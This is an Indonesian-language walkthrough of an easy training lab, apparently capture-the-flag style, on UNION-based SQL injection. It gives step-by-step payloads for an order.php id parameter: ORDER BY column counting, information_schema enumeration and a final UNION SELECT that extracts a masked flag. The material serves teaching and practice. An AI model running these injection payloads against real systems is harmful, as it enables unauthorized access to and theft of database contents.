# Lab E5 - UNION Injection dengan Hidden Text (Easy)

## Informasi Lab
- **Endpoint**: `/order.php?id=`
- **Tipe**: UNION Based Injection
- **Hint**: UI mislead - hidden text

## Analisis

### 1. Identifikasi
```
http://localhost/e5/order.php?id=1
```
Menampilkan detail order.

### 2. Inspect Element
Ada hidden div:
```html
<div style="display:none">Hidden text: try UNION</div>
```

### 3. Konfirmasi Injection
```
?id=1'
```

## Solusi

### Langkah 1 - Tentukan Kolom
```
?id=1 ORDER BY 1
?id=1 ORDER BY 2
?id=1 ORDER BY 3
?id=1 ORDER BY 4  (error = 3 kolom)
```

### Langkah 2 - Test UNION
```
?id=-1 UNION SELECT 1,2,3
```

### Langkah 3 - Enumerasi Database
```
?id=-1 UNION SELECT 1,database(),3
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()
```

### Langkah 4 - Ekstrak Flag
```
?id=-1 UNION SELECT 1,flag,3 FROM flags
```

### Payload Final
```
http://localhost/e5/order.php?id=-1 UNION SELECT 1,flag,3 FROM flags
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Selalu inspect element untuk elemen tersembunyi
- Hidden elements sering berisi hints penting
